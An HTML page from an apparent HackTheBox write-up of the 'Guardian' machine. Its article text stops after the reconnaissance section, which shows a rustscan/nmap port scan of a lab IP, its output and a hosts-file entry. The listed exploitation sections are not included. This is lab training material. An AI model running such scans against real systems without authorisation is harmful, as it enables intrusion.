<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  
    <title>Hackthebox - Guardian &middot; Re-toor</title>
    <meta name="title" content="Hackthebox - Guardian &middot; Re-toor">
  

  
  
  
    <meta name="keywords" content="web,CVE-2025-22131,xss,csrf,ssrf,LFI,mysql,python,linux,">
  
  
  
  <link rel="canonical" href="http://localhost:1313/ctf/hackthebox/guardian/">
  

  
  
    <meta name="author" content="TAH">
  
  
    
      
        
          <link href="https://github.com/re-toor" rel="me">
        
      
    
      
        
          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
        
      
    
  

  
  <meta property="og:url" content="http://localhost:1313/ctf/hackthebox/guardian/">
  <meta property="og:site_name" content="Re-toor">
  <meta property="og:title" content="Hackthebox - Guardian">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-11-12T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-12T00:00:00+00:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="CVE-2025-22131">
    <meta property="article:tag" content="Xss">
    <meta property="article:tag" content="Csrf">
    <meta property="article:tag" content="Ssrf">
    <meta property="article:tag" content="LFI">
    <meta property="og:image" content="http://localhost:1313/ctf/hackthebox/guardian/feature.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/ctf/hackthebox/guardian/feature.png">
  <meta name="twitter:title" content="Hackthebox - Guardian">

  
  
  
  
    
      
    
  
    
      
    
  
    
      
    
  
  
    
  

  
  
    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
  
  
  
  
  

  

  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
  
  
  
  
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
  
    
  
  
    
  
  
    
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
      data-copy="Copy"
      data-copied="Copied"></script>
  

  
  
























  

  

  

  

  













  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Ctf",
    "name": "Hackthebox - Guardian",
    "headline": "Hackthebox - Guardian",
    
    "inLanguage": "en",
    "url" : "http://localhost:1313/ctf/hackthebox/guardian/",
    "author" : {
      "@type": "Person",
      "name": "TAH"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-11-12T00:00:00\u002b00:00",
    "datePublished": "2025-11-12T00:00:00\u002b00:00",
    
    "dateModified": "2025-11-12T00:00:00\u002b00:00",
    
    "keywords": ["web","CVE-2025-22131","xss","csrf","ssrf","LFI","mysql","python","linux"],
    
    "mainEntityOfPage": "true",
    "wordCount": "4618"
  },
  {
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [{
            "@type": "ListItem",
            "position":  1 ,
            "name": "HackTheBox",
            "item": "http://localhost:1313/ctf/hackthebox/"
          },{
            "@type": "ListItem",
            "position":  2 ,
            "name": "Ctf",
            "item": "http://localhost:1313/ctf/"
          },{
        "@type": "ListItem",
        "position":  3 ,
        "name": "Hackthebox - Guardian",
        "item": "http://localhost:1313/ctf/hackthebox/guardian/"
      }
    ]
  }]
  </script>



  
  

  
  

  
  

  
  
</head>


















  
  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
  
  
    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
      Re-toor
    </a>
  
  <div class="flex items-center ms-auto">
    <div class="hidden md:flex">
      <nav class="flex items-center gap-x-5 h-12">
  
    
      
  
    <a
      href="/blog/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="Blog"
      title="Blog">
      
      
        <span class="text-base font-medium break-normal">
          Blog
        </span>
      
    </a>
  

    
      
  
    <a
      href="/soc/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="SOC"
      title="SOC">
      
      
        <span class="text-base font-medium break-normal">
          SOC
        </span>
      
    </a>
  

    
      
  
    <div class="nested-menu">
      <div class="cursor-pointer flex items-center">
        <a
          
            href="/ctf/"
            
          
          aria-label="CTF"
          class="flex items-center text-base font-medium bf-icon-color-hover"
          title="Ctf">
          
          <span class="text-bg font-bg break-normal" title="Ctf">
            CTF
          </span>
          <span>
            <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
          </span>
        </a>
      </div>
      <div class="menuhide">
        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
          <div class="flex flex-col space-y-3">
            
              <a
                href="/ctf/hackthebox/"
                
                aria-label="HackTheBox"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="HackTheBox">
                  HackTheBox
                </span>
              </a>
            
              <a
                href="/ctf/tryhackme/"
                
                aria-label="TryHackMe"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="TryHackMe">
                  TryHackMe
                </span>
              </a>
            
              <a
                href="/ctf/selfdev/"
                
                aria-label="Self-dev"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="Self-dev">
                  Self-dev
                </span>
              </a>
            
          </div>
        </div>
      </div>
    </div>
  

    
      
  
    <a
      href="/about/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="About"
      title="About">
      
      
        <span class="text-base font-medium break-normal">
          About
        </span>
      
    </a>
  

    
  

  

  

  
    <button
      id="search-button"
      aria-label="Search"
      class="text-base bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <div class="flex items-center">
      <button
        id="appearance-switcher"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base bf-icon-color-hover">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    </div>
  
</nav>



    </div>
    <div class="flex md:hidden">
      <div class="flex items-center h-14 gap-4">
  
    <button
      id="search-button-mobile"
      aria-label="Search"
      class="flex items-center justify-center bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <button
      id="appearance-switcher-mobile"
      type="button"
      aria-label="Dark mode switcher"
      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
      <div class="dark:hidden">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
      </div>
      <div class="hidden dark:block">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
      </div>
    </button>
  

  
    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
    </label>

    <div
      role="dialog"
      aria-modal="true"
      style="scrollbar-gutter: stable;"
      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
      bf-scrollbar">
      <label
        for="mobile-menu-toggle"
        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </label>
      <nav class="mx-auto max-w-md space-y-6">
        
  
    
    <div class="px-2">
      <a
        href="/blog/"
        aria-label="Blog"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Blog" class="text-2xl font-bold tracking-tight">
          Blog
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/soc/"
        aria-label="SOC"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="SOC" class="text-2xl font-bold tracking-tight">
          SOC
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/ctf/"
        aria-label="CTF"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Ctf" class="text-2xl font-bold tracking-tight">
          CTF
        </span>
        
          <label
            for="fullscreen-submenu-ctf"
            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
            <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
          </label>
        
      </a>

      
        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">

        <div
          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
          <div class="overflow-hidden">
            <div class="ms-7 mt-4">
              
                <a
                  href="/ctf/hackthebox/"
                  aria-label="HackTheBox"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="HackTheBox" class="text-lg">
                    HackTheBox
                  </span>
                </a>
              
                <a
                  href="/ctf/tryhackme/"
                  aria-label="TryHackMe"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="TryHackMe" class="text-lg">
                    TryHackMe
                  </span>
                </a>
              
                <a
                  href="/ctf/selfdev/"
                  aria-label="Self-dev"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="Self-dev" class="text-lg">
                    Self-dev
                  </span>
                </a>
              
            </div>
          </div>
        </div>
      
    </div>
  
    
    <div class="px-2">
      <a
        href="/about/"
        aria-label="About"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="About" class="text-2xl font-bold tracking-tight">
          About
        </span>
        
      </a>

      
    </div>
  

        
  

        
  

      </nav>
    </div>
  
</div>







    </div>
  </div>
</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        







  
  
    
  
    
  
    
  
    
  






  
    
    
      
      
    
  





    <div id="hero" class="h-[150px] md:h-[200px]"></div>
  
  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
    
    
    
    <img
      id="background-image"
      src="/ctf/hackthebox/guardian/feature_hu_74f12eefbb8f0cc6.png"
      role="presentation"
      loading="eager"
      decoding="async"
      fetchpriority="high"
      class="absolute inset-0 w-full h-full object-cover"
      >
    <div
      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
    <div
      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
  </div>

  
    <div
      id="background-blur"
      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
    
    
    <script
      type="text/javascript"
      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
      data-blur-id="background-blur"
      data-image-id="background-image"
      data-image-url="/ctf/hackthebox/guardian/feature_hu_74f12eefbb8f0cc6.png"></script>
  
      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Hackthebox - Guardian
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-11-12T00:00:00&#43;00:00">12 November 2025</time><span class="px-2 text-primary-500">&middot;</span><span>4618 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">22 mins</span>
    

    
    
  </div>

  

  
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  

  

  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
            <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
      <ul>
        <li><a href="#web-summary">Web summary</a></li>
        <li><a href="#directories">Directories</a></li>
        <li><a href="#vhosts">Vhosts</a></li>
        <li><a href="#portalguardianhtb">portal.guardian.htb</a></li>
        <li><a href="#idor">IDOR</a></li>
        <li><a href="#giteaguardianhtb">gitea.guardian.htb</a></li>
        <li><a href="#cve-2025-22131">CVE-2025-22131</a></li>
        <li><a href="#ssrf---csrf">SSRF - CSRF</a></li>
        <li><a href="#rfi">RFI</a></li>
      </ul>
    </li>
    <li><a href="#user">User</a></li>
    <li><a href="#privilege-escalation">Privilege escalation</a>
      <ul>
        <li><a href="#mark">mark</a></li>
        <li><a href="#root">root</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
      <ul>
        <li><a href="#web-summary">Web summary</a></li>
        <li><a href="#directories">Directories</a></li>
        <li><a href="#vhosts">Vhosts</a></li>
        <li><a href="#portalguardianhtb">portal.guardian.htb</a></li>
        <li><a href="#idor">IDOR</a></li>
        <li><a href="#giteaguardianhtb">gitea.guardian.htb</a></li>
        <li><a href="#cve-2025-22131">CVE-2025-22131</a></li>
        <li><a href="#ssrf---csrf">SSRF - CSRF</a></li>
        <li><a href="#rfi">RFI</a></li>
      </ul>
    </li>
    <li><a href="#user">User</a></li>
    <li><a href="#privilege-escalation">Privilege escalation</a>
      <ul>
        <li><a href="#mark">mark</a></li>
        <li><a href="#root">root</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'
    let isJumpingToAnchor = false

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      if (isJumpingToAnchor) {
        for (let i = 0; i < anchors.length; i++) {
          const anchor = anchors[i]
          if (!tocIds.has(anchor.id)) continue
          const top = anchor.getBoundingClientRect().top + window.scrollY
          if (Math.abs(window.scrollY - top) < 100) {
            return anchor.id
          }
        }
      }

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      links.forEach(link => {
        link.addEventListener('click', () => {
          isJumpingToAnchor = true
        })
      })

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          
<h2 class="relative group">Reconnaissance and Scanning
    <div id="reconnaissance-and-scanning" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance-and-scanning" aria-label="Anchor">#</a>
    </span>
    
</h2>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rustscan -a 10.10.11.84 -- -sC -sV -oN nmap</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.52
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://guardian.htb/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST
</span></span><span class="line"><span class="cl">Service Info: Host: _default_<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
<p>Thêm domain và file host</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/hosts</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.11.84     guardian.htb</span></span></code></pre></div></div>

<h2 class="relative group">Enumeration and Gaining access
